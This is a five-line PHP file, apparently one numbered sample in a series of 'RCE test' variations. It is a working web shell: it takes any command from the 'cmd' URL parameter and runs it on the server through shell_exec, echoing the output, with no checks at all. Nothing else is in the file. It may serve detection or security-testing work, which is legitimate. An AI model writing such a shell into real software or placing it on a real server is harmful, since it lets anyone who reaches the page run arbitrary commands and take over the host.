<?php
// RCE test variation #536
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>